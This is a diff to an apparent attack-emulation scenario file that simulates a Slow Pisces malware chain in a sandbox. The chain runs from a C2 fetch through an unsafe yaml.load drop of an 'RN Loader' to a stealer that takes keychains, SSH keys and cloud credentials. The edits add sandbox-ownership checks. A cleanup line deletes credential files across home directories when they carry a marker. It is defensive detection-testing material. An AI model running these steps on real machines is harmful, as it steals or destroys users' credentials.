@@ -163,6 +163,7 @@ steps:
   - id: step-01
     name: "Developer runs the coding-challenge project: python3 resolves the C2 and fetches /symbols/sp500"
     command: |
+      rm -rf /tmp/cortexsim-mp-027 && mkdir -m 700 /tmp/cortexsim-mp-027 || { echo "sandbox /tmp/cortexsim-mp-027 could not be created fresh: something else is at that path" >&2; exit 1; }
       mkdir -p /tmp/cortexsim-mp-027/stocks-pattern-analyzer/.cache
       dig +short en.stockslab.org @${LAB_RESOLVER:-127.0.0.53}
       cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
@@ -233,6 +234,7 @@ steps:
   - id: step-02
     name: "Unsafe yaml.load of the application/yaml reply writes ~/Public/__init__.py (RN Loader) and runs it"
     command: |
+      s=$(stat -c %F:%u:%a /tmp/cortexsim-mp-027 2>/dev/null || stat -f %HT:%u:%Lp /tmp/cortexsim-mp-027 2>/dev/null); [ "$s" = "directory:$(id -u):700" ] || [ "$s" = "Directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-027 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
       python3 - <<'PY'
       import hashlib
@@ -278,6 +280,7 @@ steps:
   - id: step-03
     name: "RN Loader beacons host and OS info to the C2 and polls for commands"
     command: |
+      s=$(stat -c %F:%u:%a /tmp/cortexsim-mp-027 2>/dev/null || stat -f %HT:%u:%Lp /tmp/cortexsim-mp-027 2>/dev/null); [ "$s" = "directory:$(id -u):700" ] || [ "$s" = "Directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-027 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       dig +short getstockprice.com @${LAB_RESOLVER:-127.0.0.53}
       dig +short cdn.clubinfo.io @${LAB_RESOLVER:-127.0.0.53}
       python3 - <<'PY'
@@ -331,6 +334,7 @@ steps:
   - id: step-04
     name: "RN Loader command 3: decode dockerd and docker-init, run dockerd with docker-init as its argument"
     command: |
+      s=$(stat -c %F:%u:%a /tmp/cortexsim-mp-027 2>/dev/null || stat -f %HT:%u:%Lp /tmp/cortexsim-mp-027 2>/dev/null); [ "$s" = "directory:$(id -u):700" ] || [ "$s" = "Directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-027 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       mkdir -p /tmp/cortexsim-mp-027/.rn
       python3 - <<'PY'
       import base64, os, shutil, subprocess
@@ -364,6 +368,7 @@ steps:
   - id: step-05
     name: "RN Stealer: keychain, SSH keys and AWS/kube/gcloud configs, XOR-framed R0/R64/R128/R256 to the C2"
     command: |
+      s=$(stat -c %F:%u:%a /tmp/cortexsim-mp-027 2>/dev/null || stat -f %HT:%u:%Lp /tmp/cortexsim-mp-027 2>/dev/null); [ "$s" = "directory:$(id -u):700" ] || [ "$s" = "Directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-027 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       python3 - <<'PY'
       import base64, glob, gzip, json, os, platform, random, socket, getpass, sys
       import urllib.request, urllib.error
@@ -433,6 +438,7 @@ steps:
       PY
     platform_variants:
       macos: |
+        s=$(stat -c %F:%u:%a /tmp/cortexsim-mp-027 2>/dev/null || stat -f %HT:%u:%Lp /tmp/cortexsim-mp-027 2>/dev/null); [ "$s" = "directory:$(id -u):700" ] || [ "$s" = "Directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-mp-027 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         security list-keychains -d user
         python3 - <<'PY'
         import base64, glob, gzip, json, os, platform, random, socket, getpass, sys
@@ -523,6 +529,7 @@ steps:
   - id: step-06
     name: "NGFW EAL leg: RN Loader C2 egress from the workstation to the report's domain/IP pairs"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
@@ -530,7 +537,7 @@ steps:
       [ -n "$SRC_IP" ] || SRC_IP=127.0.0.1
       SRC_HOST=$(hostname -s)
       SRC_USER=$(id -un developer 2>/dev/null || id -un)
-      cat > /tmp/mp-027-ngfw-eal.yml <<YML
+      cat > "$C/mp-027-ngfw-eal.yml" <<YML
       campaign_id: CMP-MP-027
       name: "Slow Pisces RN Loader C2 egress from the developer workstation"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -565,7 +572,7 @@ steps:
             src_host: "$SRC_HOST"
             src_user: "$SRC_USER"
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-027-ngfw-eal.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-027-ngfw-eal.yml" --live
       echo cortexsim-mp-027-step06-ngfw-eal-rn-loader-egress-emitted
     identity: container-runtime
     mitre_technique: "T1071.001"
@@ -601,7 +608,7 @@ cleanup:
   commands:
     - "for h in /home/* /Users/* /root; do for f in Public/__init__.py Library/Keychains/login.keychain-db .local/share/keyrings/login.keyring .aws/credentials .kube/config .ssh/id_ed25519; do grep -qs cortexsim-mp-027 \"$h/$f\" && rm -f \"$h/$f\"; done; done; true"
     - "find /home /Users /root -maxdepth 6 -name .cortexsim-mp-027-created 2>/dev/null | sort -r | while read -r m; do rm -f \"$m\"; rmdir \"$(dirname \"$m\")\" 2>/dev/null; done; true"
-    - "rm -rf /tmp/cortexsim-mp-027 /tmp/mp-027-ngfw-eal.yml"
+    - "rm -rf /tmp/cortexsim-mp-027"
     - "echo cortexsim-mp-027-cleanup-complete"
 
 author: "Henry Reed"
